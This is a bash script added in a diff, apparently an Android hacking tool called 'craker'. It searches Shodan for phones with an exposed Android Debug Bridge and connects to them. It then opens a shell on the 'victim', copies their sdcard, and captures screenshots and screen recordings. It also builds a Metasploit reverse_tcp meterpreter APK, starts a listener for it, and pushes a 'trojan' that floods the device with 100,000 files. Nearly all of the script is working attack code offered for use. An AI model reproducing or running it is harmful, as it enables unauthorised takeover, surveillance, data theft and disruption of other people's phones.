@@ -1,0 +1,161 @@
+#!/bin/bash
+
+craker(){
+if [ -x $PREFIX/bin/adb ]
+then
+if [[ $@ == "--help" ]]
+then
+echo -e "\e[0m\e[1;35m\e[2mcraker --adb \e[2mAdb hacking tool\e[0m"
+echo -e "\e[0m\e[1;35m\e[2mcraker --msfpay \e[2mCreated payload apk\e[0m"
+echo -e "\e[0m\e[1;35m\e[2mcraker --uppay \e[2mUp to payloads\e[0m"
+echo -e "\e[0m\e[1;35m\e[2mcraker --ninja \e[2mInject space payload\e[0m"
+elif [[ $@ == "--adb" ]]
+then
+echo -e "\e[0m\e[1;35m\e[2madb: --find \e[2mFind vulnerable ip\e[0m"
+echo -e "\e[0m\e[1;35m\e[2madb: --location <ip> \e[2mFind location ip\e[0m"
+echo -e "\e[0m\e[1;35m\e[2madb: --upload <paylaod> \e[2mUpload payload\e[0m"
+echo -e "\e[0m\e[1;35m\e[2madb: --shell \e[2mConnect to the victim's terminal\e[0m"
+echo -e "\e[0m\e[1;35m\e[2madb: --download <sdcard> <directory> \e[2mDownload sdcard\e[0m"
+echo -e "\e[0m\e[1;35m\e[2madb: --connect <ip> \e[2mConnect devices\e[0m"
+echo -e "\e[0m\e[1;35m\e[2madb: --disconnect \e[2mDisconnect devices\e[0m"
+echo -e "\e[0m\e[1;35m\e[2madb: --view \e[2mView connected devices\e[0m"
+echo -e "\e[0m\e[1;35m\e[2madb: --screen <filename> \e[2mScreencap devices\e[0m"
+echo -e "\e[0m\e[1;35m\e[2madb: --model \e[2mView model devices\e[0m"
+echo -e "\e[0m\e[1;35m\e[2madb: --record <minutes> <filename> \e[2mScreenrecord devices\e[0m"
+echo -e "\e[0m\e[1;35m\e[2madb: --packages \e[2mView installed packages\e[0m"
+elif [[ $2 == "--find" ]]
+then
+echo -e "\e[34m[+]\e[0m Looking for vulnerable ip "
+curl -s "https://www.shodan.io/search?query=Android+Debug+Bridge" -o androids.txt
+cat androids.txt | grep "host" | awk '{print $3}' >> dumps.txt
+cat dumps.txt | grep "host" | tr '""<>/=' " " | awk '{print $3}' 
+rm *.txt
+elif [[ $2 == "--location" ]]
+then
+echo -e "\e[34m[+]\e[0m Looking for location"
+curl -s "https://ipapi.co/$3/json" -o ip.txt
+geo=$(cat ip.txt | grep "country_name" | tr ',""' " " | awk '{print $3 $4}')
+echo -e "Ip: \e[34m$3\e[0m\nLocation: \e[34m$geo\e[0m"
+rm *.txt
+elif [[ $2 == "--upload" ]]
+then
+echo -e "\e[34m[+]\e[0m Uploading and installing $apk "
+adb install -r $3.apk
+adb shell monkey -p com.metasploit.stage -c android.intent.category.LAUNCHER 1
+elif [[ $2 == "--shell" ]]
+then
+echo -e "\e[34m[+]\e[0m Connect to victim terminal "
+adb shell
+elif [[ $2 == "--download" ]]
+then
+echo -e "\e[34m[+]\e[0m Download sdcard victim "
+mkdir $4 
+adb pull -p -a $3 $4
+mv $4 ../../.login/.domcuments@*
+elif [[ $2 == "--connect" ]]
+then
+echo -e "\e[34m[+]\e[0m Connect device $3 "
+adb connect $3:5555 
+elif [[ $2 == "--disconnect" ]]
+then
+echo -e "\e[34m[+]\e[0m Disconnect devices"
+adb disconnect
+elif [[ $2 == "--view" ]]
+then
+echo -en "\e[34m[+]\e[0m View devices "
+adb devices | grep "device" | awk '{print $1}' | tr 'List' ' '
+elif [[ $2 == "--screen" ]]
+then
+echo -e "\e[34m[+]\e[0m Screencap devices "
+adb shell screencap /sdcard/$3.png
+adb pull -p -a /sdcard/$3.png ../craker
+adb shell rm /sdcard/*.png
+mv $3.png ../../.login/.domcuments@*
+elif [[ $2 == "--model" ]]
+then
+echo -e "\e[34m[+]\e[0m Model devices "
+adb devices -l | grep "model" | awk '{print $4}'
+elif [[ $2 == "--record" ]]
+then
+echo -e "\e[34m[+]\e[0m Screenrecord devices "
+echo -e "\e[34m[+]\e[0m Recording $3 minutes "
+adb shell screenrecord --time-limit $3 /sdcard/$4.mp4
+adb pull -p -a /sdcard/$4.mp4 ../craker
+adb shell rm /sdcard/*.mp4
+mv $4.mp4 ../../.login/.domcuments@*
+elif [[ $2 == "--packages" ]]
+then
+echo -e "\e[34m[+]\e[0m View packages"
+adb shell pm list packages
+elif [[ $@ == "--msfpay" ]]
+then
+if [ -x $PREFIX/bin/msfconsole ]
+then
+echo -e "\e[0m\e[1;35m\e[2mmsfpay: --crp <name> <host> <port> \e[2mCreated payload\e[0m"
+echo -e "\e[0m\e[1;35m\e[2mmsfpay: --cop <name> <host> <port> \e[2mConnect payload\e[0m"
+else
+echo -e "\e[31mInstalling metasploit framework\e[0m"
+fi
+elif [[ $2 == "--crp" ]]
+then
+echo -e "\e[34m[+]\e[0m Created payload"
+msfvenom -p android/meterpreter/reverse_tcp LHOST=$4 LPORT=$5 R > $3.apk
+mv $3.apk ../../.login/.domcuments@*
+elif [[ $2 == "--cop" ]]
+then 
+echo -e "\e[34m[+]\e[0m Connect payload "
+echo "use multi/handler
+set payload android/meterpreter/reverse_tcp
+set lhost $4
+set lport $5 
+run " > $3.rc
+msfconsole -r $3.rc 
+elif [[ $@ == "--uppay" ]]
+then
+echo -e "\e[0m\e[1;35m\e[2muppay: --backup <file> \e[2mFile to up \e[0m"
+elif [[ $2 == "--backup" ]]
+then
+echo -e "\e[34m[+]\e[0m File to up $3 "
+cd ../../.login/.domcuments@*
+python -m webbrowser -n http://localhost:8080/$3
+php -S localhost:8000 | grep 'http'
+cd ../..
+elif [[ $@ == "--ninja" ]]
+then
+echo -e "\e[0m\e[1;35m\e[2mninja: --injec \e[2mStart injection, fill the space\e[0m"
+elif [[ $2 == "--injec" ]]
+then 
+echo -e "\e[34m[+]\e[0m creating troyan file"
+sleep 1
+echo -e "\e[34m[+]\e[0m his name is ninja.sh"
+sleep 1
+echo -e "\e[34m[+]\e[0m trojan created successfully"
+sleep 1
+echo '
+echo -e "\e[32m▐ ▄ ▪   ▐ ▄  ▐▄▄▄ ▄▄▄·
+•█▌▐███ •█▌▐█  ·██▐█ ▀█
+▐█▐▐▌▐█·▐█▐▐▌▪▄ ██▄█▀▀█
+██▐█▌▐█▌██▐█▌▐▌▐█▌▐█ ▪▐▌
+▀▀ █▪▀▀▀▀▀ █▪ ▀▀▀• ▀  ▀ \e[0m"
+for i in $(seq 1 100000)
+do
+touch ninja-exploit-$i
+echo -e "\e[32m Archived created $i\e[0m"
+done
+' > ninja.sh
+echo -e "\e[32m[+]\e[0m uploading trojan"
+adb push ninja.sh /sdcard > /dev/null 2>&1
+sleep 1
+rm ninja.sh
+echo -e "\e[32m[+]\e[0m starting trojan"
+sleep 1
+adb shell sh /sdcard/ninja.sh
+else
+echo -e "\e[0m\e[1;35m\e[2mcraker --help\e[0m"
+fi
+else
+echo -e "\e[31mInstalling adb !\e[0m"
+fi
+}
+
+craker $@
